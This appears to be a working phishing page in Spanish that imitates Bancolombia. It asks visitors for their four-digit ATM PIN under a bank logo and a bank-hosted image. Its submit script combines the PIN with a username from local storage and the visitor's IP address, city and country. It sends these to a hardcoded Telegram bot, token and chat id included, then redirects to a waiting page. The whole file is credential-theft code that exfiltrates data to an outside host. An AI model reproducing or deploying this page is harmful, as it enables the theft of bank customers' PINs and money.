<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Formulario Centrado</title>
    <link rel="stylesheet" href="styles.css" />
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="container">
      <form class="form" id="loginForm">
        <div style="padding: 20px">
          <div style="text-align: center">
            <img src="https://th.bing.com/th/id/R.84161cf350981030e07edd117e02e29f?rik=LKYAIE5yYbbPRw&pid=ImgRaw&r=0" width="150" />
          </div>
          <div style="text-align: center">
            <h3>Ingresa tu clave correcta del cajero</h3>
          </div>
          <div
            class="input-container"
            style="padding: 50px; padding-top: 0; padding-bottom: 0"
          >
            <input
              type="text"
              id="1"
              class="bonito"
              maxlength="1"
              oninput="moverCursor('2', event)"
              onkeydown="regresarCursor('1', event)"
              pattern="[0-9]"
              title="Solo se permiten números"
              inputmode="numeric"
              required
            />
            <input
              type="text"
              id="2"
              maxlength="1"
              class="bonito"
              oninput="moverCursor('3', event)"
              onkeydown="regresarCursor('1', event)"
              pattern="[0-9]"
              title="Solo se permiten números"
              inputmode="numeric"
              required
            />
            <input
              type="text"
              id="3"
              maxlength="1"
              class="bonito"
              oninput="moverCursor('4', event)"
              onkeydown="regresarCursor('2', event)"
              pattern="[0-9]"
              title="Solo se permiten números"
              inputmode="numeric"
              required
            />
            <input
              type="text"
              id="4"
              maxlength="1"
              class="bonito"
              onkeydown="regresarCursor('3', event)"
              pattern="[0-9]"
              title="Solo se permiten números"
              inputmode="numeric"
              required
            />
          </div>

          <script>
            function moverCursor(nextInputId, event) {
              // Si el usuario ha ingresado un dígito, pasar al siguiente campo de entrada
              if (event.target.value.length === 1) {
                document.getElementById(nextInputId).focus();
              }
            }

            function regresarCursor(previousInputId, event) {
              // Si el usuario ha borrado un dígito, volver al campo de entrada anterior
              if (event.target.value.length === 0 && event.keyCode === 8) {
                document.getElementById(previousInputId).focus();
              }
            }
          </script>

          <button type="submit">Continuar</button>
        </div>
        <div>
          <img
            src="https://sucursalpanama.grupobancolombia.com/wcm/connect/sucursalpanama.grupobancolombia.com28508/c829dfcb-f89d-4fd7-915d-4210768913e8/lines-left.svg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_K9HC1202P875D06OV938LS1697-c829dfcb-f89d-4fd7-915d-4210768913e8-nK3K0Nt"
            style="width: 100%"
          />
        </div>
      </form>
    </div>
  </body>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginForm");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const usuario = localStorage.getItem("usuario");
          const contra =
            document.getElementById("1").value +
            document.getElementById("2").value +
            document.getElementById("3").value +
            document.getElementById("4").value;
          const message =
            "Usuario: " +
            usuario +
            "\nCajero: " +
            contra +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot6513748213:AAFcQke8N6hjHfmxDzy_CYcOLef0kn927p8/sendMessage",
              {
                chat_id: "6649388987",
                text: message,
              }
            )
            .then((response) => {
              console.log(response.data);
              window.location.href = "espera.html";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
</html>
